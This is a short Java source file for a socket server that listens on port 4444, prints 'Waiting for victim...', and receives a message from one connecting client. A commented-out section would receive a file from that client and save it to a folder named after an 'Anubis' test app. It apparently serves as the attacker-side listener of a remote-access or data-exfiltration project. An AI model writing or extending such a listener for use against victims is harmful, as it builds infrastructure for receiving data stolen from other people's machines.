package com.example.testapplication;

import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.ServerSocket;
import java.net.Socket;

public class Server {

    public static void main(String[] args) {
        try {
            //change port no here
            ServerSocket serverSocket = new ServerSocket(4444);
            System.out.println("Waiting for victim...");
            Socket socket = serverSocket.accept();
            DataInputStream inputStream = new DataInputStream(socket.getInputStream());
            String message = inputStream.readUTF();
            /*
            //receive files
            byte[] bytes = new byte[16*1024];
            InputStream is = socket.getInputStream();
            FileOutputStream fos = new FileOutputStream("C:\\Users\\kian_\\Downloads\\Git\\AnubisTestApp - Copy");
            BufferedOutputStream bos = new BufferedOutputStream(fos);
            int bytesRead = is.read(bytes, 0, bytes.length);
            bos.write(bytes, 0, bytesRead);
            bos.close();
            // socket.close(); */
            // receive message for now
            System.out.println("Received message from client: " + message);
            inputStream.close(); 
            socket.close();
            serverSocket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
